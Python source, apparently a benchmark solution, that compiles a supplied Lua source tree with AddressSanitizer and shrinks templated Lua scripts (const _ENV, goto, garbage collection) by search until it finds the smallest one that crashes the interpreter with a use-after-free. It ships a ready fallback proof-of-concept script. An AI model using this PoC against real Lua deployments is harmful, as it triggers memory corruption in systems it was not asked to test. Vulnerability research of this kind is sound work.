import os
import re
import tarfile
import tempfile
import shutil
import subprocess
import itertools
from typing import List, Callable, Optional, Tuple


LUA_KEYWORDS = {
    "and", "break", "do", "else", "elseif", "end", "false", "for", "function",
    "goto", "if", "in", "local", "nil", "not", "or", "repeat", "return",
    "then", "true", "until", "while",
}


def _safe_extract_tar(tar_path: str, dst: str) -> None:
    with tarfile.open(tar_path, "r:*") as tf:
        for m in tf.getmembers():
            name = m.name
            if name.startswith("/") or ".." in name.split("/"):
                continue
            tf.extract(m, dst)


def _find_lua_src_dir(root: str) -> Optional[str]:
    targets = {"lua.c", "lparser.c", "lcode.c", "lvm.c"}
    candidates = []
    for dirpath, dirnames, filenames in os.walk(root):
        fnset = set(filenames)
        if "lua.c" in fnset and ("lvm.c" in fnset or "lparser.c" in fnset):
            candidates.append(dirpath)
        else:
            hit = 0
            for t in targets:
                if t in fnset:
                    hit += 1
            if hit >= 3:
                candidates.append(dirpath)
    if not candidates:
        return None
    candidates.sort(key=lambda p: (p.count(os.sep), len(p)))
    return candidates[0]


def _choose_cc() -> Optional[str]:
    for c in ("clang", "gcc", "cc"):
        p = shutil.which(c)
        if p:
            return p
    return None


def _compile_lua_asan(src_dir: str, out_path: str, timeout_s: int = 180) -> bool:
    cc = _choose_cc()
    if not cc:
        return False

    c_files = [os.path.join(src_dir, f) for f in os.listdir(src_dir) if f.endswith(".c")]
    if not c_files:
        return False

    if os.path.join(src_dir, "lua.c") not in c_files:
        return False

    exclude = {"luac.c", "ltests.c", "ltest.c", "minilua.c"}
    sources = [f for f in c_files if os.path.basename(f) not in exclude]

    def run_compile(extra_flags: List[str]) -> bool:
        cmd = [cc, "-std=c99", "-O1", "-g", "-fno-omit-frame-pointer", "-fno-common", "-I", src_dir]
        cmd += ["-DLUA_USE_LINUX"]
        cmd += extra_flags
        cmd += sources
        cmd += ["-lm", "-ldl", "-o", out_path]
        try:
            r = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=timeout_s)
        except Exception:
            return False
        return r.returncode == 0

    if run_compile(["-fsanitize=address", "-fno-sanitize-recover=all"]):
        return True
    if run_compile(["-fsanitize=address"]):
        return True
    if run_compile([]):
        return True
    return False


def _is_asan_crash(rc: int, stderr: bytes) -> bool:
    if rc < 0:
        return True
    s = stderr.decode("utf-8", errors="ignore")
    if "ERROR: AddressSanitizer" in s:
        return True
    if "heap-use-after-free" in s:
        return True
    if "AddressSanitizer:" in s and "ERROR" in s:
        return True
    return False


def _run_lua(lua_bin: str, script: str, timeout_s: float = 2.0) -> Tuple[int, bytes, bytes]:
    with tempfile.NamedTemporaryFile("wb", suffix=".lua", delete=False) as f:
        path = f.name
        f.write(script.encode("utf-8", errors="strict"))
    env = os.environ.copy()
    env["ASAN_OPTIONS"] = env.get("ASAN_OPTIONS", "")
    if env["ASAN_OPTIONS"]:
        if "detect_leaks=" not in env["ASAN_OPTIONS"]:
            env["ASAN_OPTIONS"] += ":detect_leaks=0"
        if "abort_on_error=" not in env["ASAN_OPTIONS"]:
            env["ASAN_OPTIONS"] += ":abort_on_error=1"
    else:
        env["ASAN_OPTIONS"] = "detect_leaks=0:abort_on_error=1"
    env.setdefault("UBSAN_OPTIONS", "halt_on_error=1:abort_on_error=1")
    try:
        r = subprocess.run([lua_bin, path], stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=env, timeout=timeout_s)
        return r.returncode, r.stdout, r.stderr
    except subprocess.TimeoutExpired as e:
        return 124, e.stdout or b"", e.stderr or b""
    except Exception as e:
        return 125, b"", str(e).encode()
    finally:
        try:
            os.unlink(path)
        except Exception:
            pass


def _gen_short_idents(n: int, forbidden: Optional[set] = None) -> List[str]:
    forbidden = forbidden or set()
    digits = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    out = []
    for L in (1, 2, 3):
        for tup in itertools.product(digits, repeat=L):
            name = "".join(tup)
            if name in LUA_KEYWORDS:
                continue
            if name in forbidden:
                continue
            if name == "_ENV":
                continue
            out.append(name)
            if len(out) >= n:
                return out
    # fallback
    i = 0
    while len(out) < n:
        name = f"v{i}"
        if name not in forbidden and name not in LUA_KEYWORDS and name != "_ENV":
            out.append(name)
        i += 1
    return out


def _tmpl_block(n: int, inner_global: bool, env_expr: str, use_goto: bool, wrap_in_func: bool) -> str:
    forbidden = {"cg", "sm", "f", "t", "x", "L"}
    names = _gen_short_idents(n, forbidden=forbidden)
    decl = ""
    if names:
        decl = "local " + ",".join(names) + "\n"
    inner = ""
    inner += decl
    inner += f"local _ENV<const>={env_expr}\n"
    if inner_global:
        inner += "local t=tostring\n"
    if use_goto:
        inner += "goto L\n"
    block = "do\n" + inner + "end\n"
    after = ""
    if use_goto:
        after += "::L::\n"
    after += 'cg"collect"\n'
    after += 'cg"collect"\n'
    after += "local x=tostring\n"
    if wrap_in_func:
        code = "local cg=collectgarbage\nlocal function f()\n" + block + after + "end\nf()\n"
    else:
        code = "local cg=collectgarbage\n" + block + after
    return code


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Default/fallback PoC (should be valid Lua 5.4+)
        def fallback() -> bytes:
            code = _tmpl_block(
                n=220,
                inner_global=True,
                env_expr="{}",
                use_goto=True,
                wrap_in_func=True,
            )
            return (code + "\n").encode("utf-8", errors="strict")

        work = tempfile.mkdtemp(prefix="pocgen_")
        try:
            if os.path.isdir(src_path):
                src_root = src_path
            else:
                src_root = os.path.join(work, "src")
                os.makedirs(src_root, exist_ok=True)
                try:
                    _safe_extract_tar(src_path, src_root)
                except Exception:
                    return fallback()

            lua_src = _find_lua_src_dir(src_root)
            if not lua_src:
                return fallback()

            lua_bin = os.path.join(work, "lua_asan")
            if not _compile_lua_asan(lua_src, lua_bin):
                return fallback()

            templates: List[Callable[[int], str]] = []
            # Vary structure to catch different miscompilations
            configs = [
                (True, "{}", False, False),
                (True, "{}", True, False),
                (False, "{}", True, False),
                (True, "{}", True, True),
                (True, "{}", False, True),
                (True, "setmetatable({}, {__index=_ENV})", True, True),
                (True, "setmetatable({}, {__index=_ENV})", False, True),
            ]
            for inner_global, env_expr, use_goto, wrap_in_func in configs:
                def make_gen(ig=inner_global, ee=env_expr, ug=use_goto, wf=wrap_in_func):
                    return lambda n: _tmpl_block(n=n, inner_global=ig, env_expr=ee, use_goto=ug, wrap_in_func=wf)
                templates.append(make_gen())

            best_script = None
            best_len = None

            for gen in templates:
                last_ok = None
                last_bad = None

                n = 0
                step = 8
                found = False
                for _ in range(10):
                    script = gen(n) + "\n"
                    rc, out, err = _run_lua(lua_bin, script, timeout_s=2.0)
                    if _is_asan_crash(rc, err):
                        found = True
                        last_bad = n
                        break
                    last_ok = n
                    n = max(n + step, 1)
                    step *= 2
                    if n > 1200:
                        break

                if not found:
                    continue

                lo = 0 if last_ok is None else last_ok
                hi = last_bad if last_bad is not None else (lo + 1)
                if hi <= lo:
                    hi = lo + 1

                # Binary search minimal n
                while hi - lo > 1:
                    mid = (lo + hi) // 2
                    script = gen(mid) + "\n"
                    rc, out, err = _run_lua(lua_bin, script, timeout_s=2.0)
                    if _is_asan_crash(rc, err):
                        hi = mid
                    else:
                        lo = mid

                final_script = gen(hi) + "\n"
                final_len = len(final_script.encode("utf-8", errors="strict"))
                if best_len is None or final_len < best_len:
                    best_len = final_len
                    best_script = final_script

            if best_script is None:
                return fallback()
            return best_script.encode("utf-8", errors="strict")
        finally:
            try:
                shutil.rmtree(work, ignore_errors=True)
            except Exception:
                pass